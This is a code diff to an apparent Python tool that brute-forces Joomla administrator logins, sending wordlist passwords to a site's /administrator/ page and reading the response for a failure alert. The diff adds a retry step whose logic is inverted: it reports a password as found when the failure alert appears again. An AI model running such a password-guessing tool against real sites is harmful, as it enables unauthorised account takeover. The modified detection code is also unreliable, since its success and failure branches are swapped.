@@ -54,7 +54,7 @@ class Joomla():
             self.verbose=False
 
         #http:/site/administrator
-        self.url = args.url+'/administrator/'
+        self.url = args.url +'/administrator/'
         self.ret = 'aW5kZXgucGhw'
         self.option='com_login'
         self.task='login'
@@ -111,12 +111,22 @@ class Joomla():
             print(f'Current Word #{processed_words}: {password}')
             response = soup.find('div', {'class': 'alert alert-warning'})
             print(response)
+            # Check if the message is present
+    
             if response:
                 if self.verbose:
                     print(f'{bcolors.FAIL} {self.username}:{password}{bcolors.ENDC}')
             else:
-                print(f'{bcolors.OKGREEN} {self.username}:{password}{bcolors.ENDC}')
-                break
+                # Try one more time just in case this script received an false reading
+                r = requests.post(self.url, data = data, proxies=self.proxy, cookies=self.cookies, headers=headers)
+                soup = BeautifulSoup(r.text, 'html.parser')
+                print(f'Trying again on current Word #{processed_words}: {password}')
+                if soup.find('div', {'class': 'alert alert-warning'}):
+                    print(f'{bcolors.OKGREEN} {self.username}:{password}{bcolors.ENDC}')
+                    break
+                else:
+                    print('Oh well')
+                    
 
     @staticmethod
     def getdata(path):
